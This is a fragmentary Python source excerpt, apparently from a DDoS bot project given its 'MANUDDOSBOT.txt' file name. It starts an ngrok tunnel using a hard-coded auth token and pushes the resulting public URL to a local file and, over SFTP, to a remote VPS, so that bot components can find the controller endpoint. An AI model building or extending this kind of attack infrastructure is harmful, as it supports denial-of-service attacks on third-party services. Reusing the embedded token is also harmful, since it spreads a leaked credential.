...
def configure_ngrok():
    ngrok_token = "2qCryKP1wWGhPWoeeRnWgY5d27C_2sL9g4BkaEmZyETqaLNcT"
    try:
...
def update_soul_txt(public_url):
    with open("MANUDDOSBOT.txt", "w") as file:
        file.write(public_url)
    print(f"New ngrok link saved in MANUDDOSBOT.txt")
...
def update_vps_soul_txt(public_url):
    ...
    try:
        ...
        sftp = ssh.open_sftp()
        with sftp.open("MANUDDOSBOT.txt", "w") as file:
            file.write(public_url)
        sftp.close()
        ssh.close()
        print("Updated MANUDDOSBOT.txt on VPS successfully.")
    except Exception as e:
        print(f"Failed to update MANUDDOSBOT.txt on VPS: {str(e)}")
